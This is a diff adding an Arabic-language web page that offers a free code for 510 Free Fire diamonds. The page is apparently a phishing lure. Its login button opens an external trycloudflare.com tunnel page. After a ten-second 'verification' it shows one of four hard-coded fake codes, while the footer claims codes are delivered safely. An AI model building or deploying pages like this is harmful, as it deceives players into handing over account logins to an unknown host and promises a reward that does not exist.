@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎉 كود فري فاير 510 جوهرة</title>
+
+<style>
+body{
+  margin:0;
+  font-family: 'Arial', sans-serif;
+  color:#fff;
+  text-align:center;
+  background: linear-gradient(270deg,#0f2027,#203a43,#2c5364,#6a11cb,#2575fc);
+  background-size: 800% 800%;
+  animation: bg 18s ease infinite;
+}
+
+@keyframes bg{
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
+}
+
+.top-bar{
+  padding:15px;
+  font-size:28px;
+  font-weight:bold;
+  text-shadow:0 0 15px #000;
+}
+
+.logo{
+  width:90px;
+  margin-top:10px;
+}
+
+.container{
+  max-width:700px;
+  margin:30px auto;
+  padding:30px;
+  border-radius:25px;
+  background:rgba(0,0,0,0.7);
+  box-shadow:0 0 40px #00eaff;
+}
+
+h1{
+  color:#ffd700;
+  text-shadow:0 0 15px #000;
+}
+
+p{
+  font-size:18px;
+  line-height:1.6;
+}
+
+button{
+  padding:15px 30px;
+  font-size:20px;
+  border:none;
+  border-radius:15px;
+  cursor:pointer;
+  margin:15px;
+  font-weight:bold;
+  transition:0.3s;
+  box-shadow:0 0 25px #fff;
+}
+
+#loginBtn{
+  background:#ff3c3c;
+  color:#fff;
+}
+
+#codeBtn{
+  background:#00eaff;
+  color:#000;
+}
+
+button:hover{
+  transform:scale(1.1);
+}
+
+button:disabled{
+  opacity:0.5;
+  cursor:not-allowed;
+}
+
+#codeBox{
+  margin-top:20px;
+  font-size:26px;
+  color:#00ffcc;
+  font-weight:bold;
+  text-shadow:0 0 10px #000;
+}
+
+.small-logo{
+  width:70px;
+  margin-top:10px;
+}
+
+.footer{
+  margin-top:40px;
+  padding:20px;
+  background:rgba(0,0,0,0.5);
+  border-top:2px solid #00eaff;
+}
+</style>
+</head>
+<body>
+
+<div class="top-bar">
+🌙 رمضان مبارك 🌙
+<br>
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
+</div>
+
+<div class="container">
+  <h1>💎 احصل على كود فري فاير 510 جوهرة</h1>
+
+  <p>
+  قم بتسجيل الدخول أولاً للحصول على كود الجواهر الخاص بلعبة فري فاير.
+  </p>
+
+  <!-- زر تسجيل الدخول -->
+  <button id="loginBtn">تسجيل دخول</button>
+  <br>
+
+  <!-- زر الكود -->
+  <button id="codeBtn" disabled>الحصول على كود فري فاير</button>
+
+  <p>يجب تسجيل دخول حتى تحصل على الكود</p>
+
+  <!-- عرض الكود -->
+  <div id="codeBox"></div>
+
+  <p style="color:#ffd700; font-size:22px;">💎 كود 510 جوهرة 💎</p>
+  <img class="small-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
+</div>
+
+<div class="footer">
+  <h2>💡 لمحة عن فري فاير والموقع</h2>
+  <p>
+  فري فاير هي لعبة باتل رويال شهيرة مليئة بالحماس والمغامرات،
+  حيث تساعدك الجواهر على شراء الأسلحة والسكنات وتطوير حسابك داخل اللعبة.
+  </p>
+  <p>
+  هذا الموقع يوفر تجربة تصميم احترافية لعرض أكواد الجواهر بطريقة آمنة وسريعة
+  مع واجهة قوية وخلفية جميلة متحركة.
+  </p>
+  <p><strong>👨‍💻 اسم المطور: ADEM</strong></p>
+</div>
+
+<script>
+const loginBtn = document.getElementById("loginBtn");
+const codeBtn = document.getElementById("codeBtn");
+const codeBox = document.getElementById("codeBox");
+
+const codes = [
+"555552525643524",
+"34342421212121",
+"34315834242424",
+"3525242424244"
+];
+
+let index = 0;
+let logged = false;
+
+// عند الضغط على تسجيل الدخول
+loginBtn.addEventListener("click", () => {
+  // فتح رابط تسجيل الدخول
+  window.open("https://convenient-state-village-coaches.trycloudflare.com/login", "_blank");
+
+  logged = true;
+  codeBtn.disabled = true;
+  codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول...";
+
+  // بعد 10 ثواني يظهر الكود
+  setTimeout(() => {
+    if(logged){
+      codeBtn.disabled = false;
+      codeBox.textContent = "✅ تم التحقق! اضغط على الحصول على الكود";
+    }
+  }, 10000);
+});
+
+// عند الضغط على الحصول على الكود
+codeBtn.addEventListener("click", () => {
+  if(logged){
+    codeBox.textContent = "كودك: " + codes[index] + " 💎";
+    index = (index + 1) % codes.length; // تغيير الكود كل مرة
+  } else {
+    alert("يجب تسجيل الدخول أولاً!");
+  }
+});
+</script>
+
+</body>
+</html>
